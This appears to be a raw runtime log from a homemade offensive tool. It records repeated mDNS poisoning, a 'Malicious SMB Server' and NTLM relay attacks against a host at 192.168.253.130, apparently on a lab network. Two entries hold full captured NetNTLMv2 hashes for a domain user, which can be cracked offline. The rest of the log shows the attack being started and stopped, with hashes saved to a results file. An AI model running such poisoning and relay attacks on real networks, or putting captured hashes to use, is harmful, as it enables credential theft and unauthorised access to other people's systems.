2021-11-03 18:31:35.047 | INFO     | project.igris:show_settable_variables_necessary:210 - Showing necessary settable variables
2021-11-03 18:32:43.194 | INFO     | project.igris:show_settable_variables_necessary:210 - Showing necessary settable variables
2021-11-03 18:37:05.427 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 18:37:05.429 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 18:37:11.146 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 18:37:11.180 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 18:37:12.127 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49862)
2021-11-03 18:37:12.610 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-03 18:37:12.612 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-03 18:37:12.614 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:c44e0bcaa624db62019e06ae13c13195:0101000000000000007cccd0e1d0d70124fcefab217cbd8b00000000010010007a004f00520054004b00530077004200030010007a004f00520054004b005300770042000200100046005100660079007500520056005000040010004600510066007900750052005600500007000800007cccd0e1d0d70106000400020000000800300030000000000000000000000000200000a83c2f4b01aa6db48244f3a58764a25907daad7ee20580caa7157fc5b8f574840a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
2021-11-03 18:37:12.749 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-03 18:37:12.771 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-03 18:37:12.940 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-03 18:37:16.670 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:109 - Exiting smb relay attack ...
2021-11-03 19:15:02.400 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 19:15:02.403 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 19:15:37.063 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 19:15:37.101 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 19:15:38.074 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,62797)
2021-11-03 19:15:38.106 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-03 19:15:38.106 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-03 19:15:38.107 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:be67b028077ac3fd62b061dbb8c33aa4:01010000000000000029482fe7d0d70141242b69bb3be02f00000000010010006f0051004c00540049007a0057006700030010006f0051004c00540049007a005700670002001000580053004700550042004f006b004f0004001000580053004700550042004f006b004f00070008000029482fe7d0d70106000400020000000800300030000000000000000000000000200000a83c2f4b01aa6db48244f3a58764a25907daad7ee20580caa7157fc5b8f574840a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
2021-11-03 19:15:38.127 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-03 19:15:38.144 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-03 19:15:38.175 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-03 19:15:40.778 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:74 - Exiting smb relay attack ...
2021-11-03 20:20:55.340 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:85 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:20:55.341 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:20:55.343 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:35:00.451 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:35:00.453 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:35:00.456 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:35:15.492 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:37:20.159 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:37:20.161 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:37:20.164 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:37:22.306 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:37:39.880 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:37:39.883 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:37:39.885 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:37:41.282 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:47:54.454 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:86 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:47:54.457 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:47:54.459 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:48:52.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 20:48:52.679 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 20:48:54.515 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 20:48:54.563 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 20:49:04.811 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 20:49:04.848 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 20:53:02.266 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:53:02.271 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:53:03.474 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-03 20:53:05.489 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:123 - The attack is already running in the background
2021-11-03 20:53:56.616 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:53:56.619 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:53:56.624 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:53:59.097 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:54:08.264 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
2021-11-03 20:54:18.239 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:54:18.241 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:54:18.243 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:54:21.200 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:54:58.379 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
2021-11-03 20:58:13.663 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:58:13.665 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:58:13.666 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:58:18.225 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:59:26.645 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:86 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:59:26.650 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:59:26.652 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:59:29.162 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:59:33.473 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
2021-11-05 12:02:23.103 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:02:23.106 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:02:24.312 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-05 12:02:27.035 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:123 - The attack is already running in the background
2021-11-05 12:03:21.918 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 12:03:21.920 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:03:21.921 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:03:27.683 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 12:04:31.880 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:04:31.881 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:04:33.216 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:83 - Exiting smb relay attack ...
2021-11-05 12:07:28.235 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:07:28.236 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:07:29.320 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:83 - Exiting smb relay attack ...
2021-11-05 12:10:34.777 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:10:34.780 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:10:36.384 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:84 - Exiting smb relay attack ...
2021-11-05 12:18:49.930 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:18:49.931 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:18:51.136 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:84 - Exiting smb relay attack ...
2021-11-05 12:20:20.133 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:20:20.139 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:20:21.072 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:85 - Exiting smb relay attack ...
2021-11-05 12:20:37.993 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:20:37.995 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:20:39.100 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:85 - Exiting smb relay attack ...
2021-11-05 12:25:49.777 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:25:49.778 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:25:50.624 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:84 - Exiting smb relay attack ...
2021-11-05 12:29:56.958 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:29:56.961 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 12:29:58.536 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:85 - Exiting smb relay attack ...
2021-11-05 12:30:34.275 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:50 - There is not mss process in the background
2021-11-05 12:31:34.746 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 12:31:41.853 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:16:10.740 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:16:10.741 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:16:12.606 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:16:23.845 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:16:23.847 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:16:27.010 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:20:52.983 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:20:52.984 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:21:37.839 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:21:37.841 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:10.194 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:10.196 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:10.205 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:10.207 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:10.208 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:15.066 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:22:17.202 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:17.202 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:17.204 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:17.204 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:17.210 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:17.210 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:17.211 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:17.211 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:17.211 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:17.211 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:18.574 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:22:18.574 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:22:35.830 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:22:35.830 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:22:35.830 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:22:35.834 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:35.834 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:35.834 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:35.834 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:35.834 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:35.834 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:35.841 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:35.841 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:35.841 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:35.844 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:35.844 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:35.844 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:35.845 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:35.845 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:35.845 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:46.964 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:22:46.964 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:22:46.964 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:22:49.185 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:49.185 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:49.185 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:49.187 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:49.187 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:49.187 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:49.185 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:22:49.187 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:49 - Starting Malicious SMB Server ...
2021-11-05 14:22:49.193 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:49.193 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:49.193 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:49.193 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:22:49.194 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:49.194 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:49.194 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:49.194 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:22:49.197 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:49.197 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:49.197 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:49.197 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:22:50.674 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:22:50.674 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:22:50.674 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:22:50.674 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:25:24.623 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:25:24.626 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:25:24.627 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:25:24.632 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:25:24.633 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:25:24.634 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:25:36.135 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:25:36.138 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:25:36.157 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:25:36.162 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:25:36.165 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:25:37.170 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:25:37.994 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:25:37.994 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:25:37.996 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:25:37.996 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:25:38.001 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:25:38.001 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:25:38.002 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:25:38.002 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:25:38.013 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:25:38.013 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:25:39.062 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
